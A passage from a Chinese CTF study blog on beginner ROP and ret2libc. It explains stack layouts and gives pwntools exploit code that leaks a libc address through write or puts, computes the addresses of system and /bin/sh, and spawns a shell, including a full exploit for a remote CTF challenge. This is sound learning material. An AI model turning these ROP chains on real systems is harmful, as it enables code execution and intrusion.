class="number">0</span>: <span class="string">&quot;rdi&quot;</span>  <span class="string">&quot;1&quot;</span>                                      ----<span class="string">&quot;/bin/sh_addr&quot;</span></span><br><span class="line">----esp<span class="number">0</span>+<span class="number">8</span>: <span class="string">&#x27;pop_rsi_r15_ret&#x27;</span>                                  ----<span class="string">&quot;system_addr&quot;</span> </span><br><span class="line">----esp+<span class="number">16</span>:<span class="string">&quot;leak_func_got&quot;</span>                          这次布栈就像ret_text中的<span class="keyword">system</span>函数一样来布</span><br><span class="line"></span><br><span class="line">----esp+<span class="number">24</span>:<span class="string">&quot;r15&quot;</span>  <span class="number">8</span>位可以是<span class="string">&quot;deadbeef&quot;</span></span><br><span class="line">----esp+<span class="number">32</span>:<span class="string">&quot;泄露GOT真正地址的函数如write_sym&quot;</span></span><br><span class="line">----esp+<span class="number">40</span>:<span class="string">&#x27;返回地址&#x27;</span></span><br></pre></td></tr></table></figure><p></p><h3 id="1padding"><a class="anchor" href="#1padding">#</a> 1.padding</h3><p>首先我们需要确定 padding，在哪里溢出，把这个空填满，溢出到 rbp 完<br>----padding 和以前一样，看哪里 gets 或者 read 函数，这里其实就是 scanf<br>---- 可以通过 ida 或者动态调试得到<br>---- 参考以前的题目，像 buuctf 前几道 rip,level..</p><h3 id="2第一次溢出目标获得的libc某个函数的真实地址"><a class="anchor" href="#2第一次溢出目标获得的libc某个函数的真实地址">#</a> 2. 第一次溢出，目标获得的 libc 某个函数的真实地址</h3><h4 id="21第一次溢出"><a class="anchor" href="#21第一次溢出">#</a> 2.1 第一次溢出</h4><p>比如：以下是 write 函数为例</p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">leak_func_name =<span class="string">&#x27;write&#x27;</span>  </span><br><span class="line">leak_func_got = elf.got[leak_func_name]   <span class="comment">#  leak_func_got泄露的got表   去ida上看write的地址 </span></span><br><span class="line"><span class="comment">#got.plt:0000000000404018 48          unk_404018      db  48h ; H OFF64 EXTDEF [extern,404048]=404048 (write)</span></span><br><span class="line"><span class="comment">#leak_func_got = 404018</span></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line">write_sym = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4011fb</span> <span class="comment">#用ROPgadget查的</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4011f9</span><span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* padding + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_ret) + p64(leak_func_got) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment">#     产生溢出的字符串    pop_rdi_ret  rdi存的值   pop_rsi_r15_ret    leak_func_got泄露的got表    r15</span></span><br><span class="line"><span class="comment">#                            第一个参数    第二个参数（rdx第三个参数没有先不管）</span></span><br><span class="line"><span class="comment">#      第一步         第2步rdi     【    第三步 plt表    】          第四步got表    第五步填deedbeef        </span></span><br><span class="line">payload = payload + p64(write_sym) + p64(return_addr)  </span><br><span class="line"><span class="comment">#           第六步write偏移地址  第七步返回地址（进入第二次溢出的返回地址）                                   </span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br></pre></td></tr></table></figure><p></p><h4 id="22收获这个函数的真实地址"><a class="anchor" href="#22收获这个函数的真实地址">#</a> 2.2 收获这个函数的真实地址</h4><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gets_addr=u64(p.recv()[:<span class="number">8</span>]) <span class="comment">#p.recv()[:8]: 这个部分是将从管道中接收到的数据的前 8 个字节切片出来。u64换成无符号整数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) # 接收puts的真实地址</span></span><br><span class="line"><span class="comment">#p.recv(6): 从管道中接收 6 个字节的数据。.ljust(8, b&#x27;\x00&#x27;): 对接收到的 6 个字节数据进行填充，</span></span><br><span class="line"><span class="comment">#使其总长度为 8 字节，填充内容是 0x00 字节。以后可以不是6位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_addr=u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))  #得到 puts 函数 的地址;</span></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;\n&#x27;): 从管道中接收数据，直到遇到换行符 \n 为止。这个函数会将接收到的数据包括换行符在内全部返回。</span></span><br><span class="line"><span class="comment">#[:-1]: 使用切片操作，去掉接收到的数据中的最后一个字符，即换行符 \n。</span></span><br><span class="line"><span class="comment">#.ljust(8, &#x27;\0&#x27;): 将剩余的数据（不包括换行符）进行填充，使其总长度为 8 字节，填充内容是空字符 \0。</span></span><br></pre></td></tr></table></figure><p></p><h3 id="3第二次溢出构造payload2"><a class="anchor" href="#3第二次溢出构造payload2">#</a> 3. 第二次溢出构造 payload2</h3><h4 id="31获得基地址"><a class="anchor" href="#31获得基地址">#</a> 3.1 获得基地址</h4><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<span class="comment">#本地调试，可用ldd查</span></span><br><span class="line">libc_base=gets_addr-libc.symbols[<span class="string">&quot;gets&quot;</span>]  <span class="comment">#    得到基地址</span></span><br></pre></td></tr></table></figure><p></p><h4 id="32算system和binsh地址"><a class="anchor" href="#32算system和binsh地址">#</a> 3.2 算 system 和 binsh 地址</h4><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#远程版本</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)       <span class="comment"># 得到 libc的版本;</span></span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)     <span class="comment">#    得到基地址</span></span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)     <span class="comment">#  利用偏移地址 得到 system函数的地址</span></span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)     <span class="comment">#  得到  bin/sh 的 地址</span></span><br></pre></td></tr></table></figure><p></p><h4 id="33获取shell"><a class="anchor" href="#33获取shell">#</a> 3.3 获取 shell</h4><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload2=offset*<span class="string">b&quot;B&quot;</span>+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) <span class="comment">#64位三步走，和rettext一样</span></span><br><span class="line">一般会接收到程序本身的字符串后，再发送payload</span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload2)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p></p><h3 id="2x86最大区别是参数存放不用寄存器"><a class="anchor" href="#2x86最大区别是参数存放不用寄存器">#</a> 2）x86: 最大区别是参数存放不用寄存器</h3><h3 id="0使用条件"><a class="anchor" href="#0使用条件">#</a> 0. 使用条件</h3><p>ret2libc 的使用条件<br>泄漏 Libc 函数地址的条件：程序有输出函数，如 puts、printf、write；要输出函数的目的是要泄漏地址<br>实现：设置好输出函数的参数为某函数 GOT 表地址；GOT 表中保存已调用过的函数的真实地址</p><h3 id="1核心"><a class="anchor" href="#1核心">#</a> 1. 核心</h3><p>泄漏 ret2libc_32 任意一个函数的位置<br>获取 libc 的版本<br>根据偏移获取 shell 和 sh 的位置<br>执行程序获取 shell</p><h3 id="2内存分布举例"><a class="anchor" href="#2内存分布举例">#</a> 2. 内存分布，举例</h3><p>---esp<br>--- ...<br>--- buf<br>---ebp 栈帧<br>---write@plt 返回地址<br>---main @@@@@' 预留返回地址！！！！！！！！'@@@@<br>--- 1 write 函数参数一 (1)<br>---write_got 地址 write 函数参数二 (write_got 地址)<br>--- 4 write 函数参数三 (写 4 字节) 32 位<br>--- 高地址，栈底</p><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231112225545549.png" alt="image-20231112225545549" style="zoom:50%"></p><h3 id="3第一次溢出目标找到一个函数地址"><a class="anchor" href="#3第一次溢出目标找到一个函数地址">#</a> 3. 第一次溢出，目标：找到一个函数地址</h3><p>第一个以 write 为例子：</p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">write_plt=e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got=e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"><span class="comment">#    char[88]        ebp                                     write函数参数一(1) write函数参数二(write_got地址)</span></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">b&#x27;a&#x27;</span>+ p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#                                write函数返回地址    (返回到main函数)                  write函数参数三(写4字节)32位</span></span><br><span class="line"><span class="comment">#        0x88*b&#x27;a&#x27;+ p32(0xdeadbeef)其实是char和ebp分开的，可以合起来算</span></span><br></pre></td></tr></table></figure><p></p><p>' 为什么加 1，加 4'<br>原因：write 函数本身有三个参数（1，'hello!',5）<br>函数说明：write () 会把参数 buf 所指的内存写入 count 个字节到参数 fd 所指的文件内。<br>返回值：如果顺利 write () 会返回实际写入的字节数（len）。当有错误发生时则返回 - 1，错误代码存入 errno 中。<br>//write(int fd, const void *buf, size_t count);<br>第一个参数 文件描述符 fd 1 输出，0 输入<br>第二个参数 无类型的指针 buf，可以存放要写的内容<br>第三个参数 写多少字节数 4 字节</p><p>下面再举一个：我们决定用泄露_<strong>_libc_strart_main 的地址</strong>，来判定 libc 的版本</p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])<span class="comment">#调用puts函数后，ret到main函数，用main函数里面的gets来获取libc_start的地址</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line">gets_addr = u32(p.recv())</span><br></pre></td></tr></table></figure><p></p><h3 id="4第二次溢出目标直接获得shell像rettext一样"><a class="anchor" href="#4第二次溢出目标直接获得shell像rettext一样">#</a> 4. 第二次溢出，目标：直接获得 shell，像 rettext 一样</h3><h4 id="41获得基地址"><a class="anchor" href="#41获得基地址">#</a> 4.1 获得基地址</h4><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;/lib32/libc.so.6&quot;</span>) <span class="comment">#获得libc版本号</span></span><br><span class="line">libc_base = gets_addr - libc.symbols[<span class="string">&quot;gets&quot;</span>]</span><br></pre></td></tr></table></figure><p></p><h4 id="42system和binsh地址"><a class="anchor" href="#42system和binsh地址">#</a> 4.2system 和 binsh 地址</h4><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br></pre></td></tr></table></figure><p></p><h4 id="43结束"><a class="anchor" href="#43结束">#</a> 4.3 结束</h4><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2 = padding*<span class="string">b&quot;A&quot;</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) <span class="comment">#32位两步走</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p></p><h4 id="44补充"><a class="anchor" href="#44补充">#</a> 4.4 补充</h4><p>大佬 1 号心得<br>ROP 中对 retlibc 技术的一些学习心得<br>漏洞利用思路：</p><p>1. 找到泄露库函数地址的漏洞，获取 libc 版本（因为一般不会给你 libc.so 文件）<br>查询 libc 版本一般有三种方法：</p><p>1.libcsearcher 库。在编写 exp 的时候用 from LibcSearcher import LibcSearcher 导入<br>通过 libc.dump ('system') 可以得到 system 函数的偏移，libc.dump ('str_bin_sh') 得到 binsh 字符串的偏移</p><p>2.pwntools 自带的 Dynelf，需要先构造一个 leak 函数和一个可以不断触发溢出的漏洞</p><p>一个模板：</p><p></p><figure class="highlight c"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">leak</span><span class="params">(address)</span>:</span><br><span class="line">  #各种预处理</span><br><span class="line">  payload = <span class="string">&quot;xxxxxxxx&quot;</span> + address + <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  #各种处理</span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  <span class="built_in">log</span>.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data or <span class="string">&#x27;&#x27;).encode(&#x27;</span>hex<span class="number">&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;./xxx&quot;</span>))      #初始化DynELF模块 </span><br><span class="line">systemAddress = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)  #在libc文件中搜索system函数的地址</span><br></pre></td></tr></table></figure><p></p><p>3. 在线查询网站，通过函数的后三位数值查询。<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZQ==">https://libc.blukat.me</span></p><p>典型的题目–adworld 里的 level1（非常典型的 retlibc）<br>源码：</p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;What&#x27;s this:%p?\n&quot;</span>, &amp;buf);			</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, 0x100u);		//溢出点</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exp：</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./level1&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">42536</span>)</span><br><span class="line"></span><br><span class="line">writeplt= <span class="number">0x08048370</span></span><br><span class="line">readgot=<span class="number">0x0804A00C</span></span><br><span class="line">vuln=<span class="number">0x0804847B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(writeplt)+p32(vuln)+p32(<span class="number">1</span>)+p32(readgot)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">readaddr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(readaddr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, readaddr)</span><br><span class="line">libcbase = readaddr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(system_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p></p><p>笔记:<br>context.log_level='debug’开启调试模式；<br>大佬原文链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNzA2OTI0L2FydGljbGUvZGV0YWlscy84OTYwNzY4Mw==">https://blog.csdn.net/qq_41706924/article/details/89607683</span></p><div class="tags"><a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-11-13 00:14:49" itemprop="dateModified" datetime="2023-11-13T00:14:49+08:00">2023-11-13</time> </span><span id="CTF/Pwn/note/Pwn1/" class="item leancloud_visitors" data-flag-title="Pwn复习-初级ROP" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="4riH04X 微信支付"><p>微信支付</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>4riH04X <i class="ic i-at"><em>@</em></i>は永遠に不滅である</li><li class="link"><strong>本文链接：</strong> <a href="http://4rih04x.fun/CTF/Pwn/note/Pwn1/" title="Pwn复习-初级ROP">http://4rih04x.fun/CTF/Pwn/note/Pwn1/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/CTF/Pwn/note/PWN%E6%A6%82%E8%BF%B0/" itemprop="url" rel="prev" data-background-image="&#x2F;images&#x2F;large&#x2F;6833939bly1giclhpw3lwj20zk0m8gvw.jpg" title="Pwn概述"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 笔记</span><h3>Pwn概述</h3></a></div><div class="item right"><a href="/computer-science/Data-Structures/cpp/%E4%BA%8C%E5%8F%89%E6%A0%91%E9%A2%98%E8%A7%A3/" itemprop="url" rel="next" data-background-image="&#x2F;images&#x2F;large&#x2F;6833939bly1giclxxcb6rj20zk0m8b29.jpg" title="二叉树题解"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> C++</span><h3>二叉树题解</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80rop%E7%BC%96%E7%A8%8B%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">一.ROP 编程介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8Cret2text"><span class="toc-number">2.</span> <span class="toc-text">二.ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">1. 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2x64%E5%92%8Cx86%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E4%B8%8D%E5%90%8C%E5%AF%BC%E8%87%B4ret2text%E5%B8%83%E6%A0%88%E4%B8%8D%E5%90%8C"><span class="toc-number">2.2.</span> <span class="toc-text">2.x64 和 x86 函数调用方式不同导致 ret2text 布栈不同</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.1 函数调用约定</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%A7%A3%E6%B3%95%E4%B8%BE%E4%BE%8B"><span class="toc-number">2.3.</span> <span class="toc-text">3. 解法举例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#31x86%E9%A2%98%E8%A7%A3%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">3.1x86 题解方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32x64%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.2.</span> <span class="toc-text">3.2x64 解题方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#33x86%E4%B8%BE%E4%BE%8B"><span class="toc-number">2.3.3.</span> <span class="toc-text">3.3x86 举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#33x86%E9%A2%98%E8%A7%A3%E8%A1%A5%E5%85%85%E7%96%91%E9%97%AE%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8A%A0p320-%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="toc-number">2.3.4.</span> <span class="toc-text">3.3x86 题解补充疑问（为什么加 p32 (0)）- 栈对齐</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89ret2libc"><span class="toc-number">3.</span> <span class="toc-text">三.ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i%E7%81%B5%E9%AD%82%E4%BA%94%E9%97%AE"><span class="toc-number">3.1.</span> <span class="toc-text">I. 灵魂五问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">3.2.</span> <span class="toc-text">II. 自己的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iii%E8%A7%A3%E6%B3%95%E4%B8%BE%E4%BE%8B"><span class="toc-number">3.3.</span> <span class="toc-text">III. 解法举例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x64"><span class="toc-number">3.4.</span> <span class="toc-text">1)x64:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="toc-number">3.5.</span> <span class="toc-text">0. 调用约定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#01%E4%B8%BE%E4%BE%8B"><span class="toc-number">3.5.1.</span> <span class="toc-text">0.1 举例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1padding"><span class="toc-number">3.6.</span> <span class="toc-text">1.padding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BA%A2%E5%87%BA%E7%9B%AE%E6%A0%87%E8%8E%B7%E5%BE%97%E7%9A%84libc%E6%9F%90%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">3.7.</span> <span class="toc-text">2. 第一次溢出，目标获得的 libc 某个函数的真实地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BA%A2%E5%87%BA"><span class="toc-number">3.7.1.</span> <span class="toc-text">2.1 第一次溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#22%E6%94%B6%E8%8E%B7%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">3.7.2.</span> <span class="toc-text">2.2 收获这个函数的真实地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%BA%A2%E5%87%BA%E6%9E%84%E9%80%A0payload2"><span class="toc-number">3.8.</span> <span class="toc-text">3. 第二次溢出构造 payload2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#31%E8%8E%B7%E5%BE%97%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">3.8.1.</span> <span class="toc-text">3.1 获得基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E7%AE%97system%E5%92%8Cbinsh%E5%9C%B0%E5%9D%80"><span class="toc-number">3.8.2.</span> <span class="toc-text">3.2 算 system 和 binsh 地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#33%E8%8E%B7%E5%8F%96shell"><span class="toc-number">3.8.3.</span> <span class="toc-text">3.3 获取 shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2x86%E6%9C%80%E5%A4%A7%E5%8C%BA%E5%88%AB%E6%98%AF%E5%8F%82%E6%95%B0%E5%AD%98%E6%94%BE%E4%B8%8D%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">3.9.</span> <span class="toc-text">2）x86: 最大区别是参数存放不用寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span 